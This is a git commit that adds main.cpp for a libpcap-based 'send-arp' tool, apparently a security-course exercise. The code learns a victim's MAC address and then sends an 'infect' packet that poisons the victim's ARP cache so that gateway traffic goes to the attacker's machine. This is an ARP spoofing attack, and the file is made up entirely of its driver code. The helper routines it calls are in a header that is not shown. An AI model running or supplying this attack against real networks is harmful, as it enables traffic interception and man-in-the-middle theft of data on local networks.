d71a485565989b6d2662797971bcb6438c1de1dd
hyun-stone <hyun698207@gmail.com>
2022-08-07 10:39:39 -0700

    main

---
+++ main.cpp
@@ -0,0 +1,43 @@
+#include <pcap.h>
+#include <sys/ioctl.h>
+#include <string.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+#include <cstdio>
+#include "hdr.h"
+
+void usage() {
+    printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
+    printf("sample: send-arp wlan0 172.20.10.3 172,20,10,1\n");
+}
+
+int main(int argc, char* argv[]) {
+    if (argc != 4) {
+        usage();
+        return -1;
+    }
+
+    char* dev = argv[1];
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
+    if (handle == NULL) {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+        return -1;
+    }
+
+    uint8_t MY_MAC[6];
+    uint8_t SENDER_MAC[6];
+    uint32_t SENDER_IP = Str2A(argv[2]);
+    uint32_t GATEWAY_IP = Str2A(argv[3]);
+    uint32_t MY_IP = GetMyIp(dev);
+    GetMyMac(dev,MY_MAC);
+
+    SendRequest(handle,MY_IP,MY_MAC,SENDER_IP,SENDER_MAC);
+    SendInfect(handle,MY_MAC,SENDER_IP,SENDER_MAC,GATEWAY_IP);
+
+    PrintIP(ntohl(MY_IP));
+    PrintMAC(SENDER_MAC);
+
+    pcap_close(handle);
+}
+
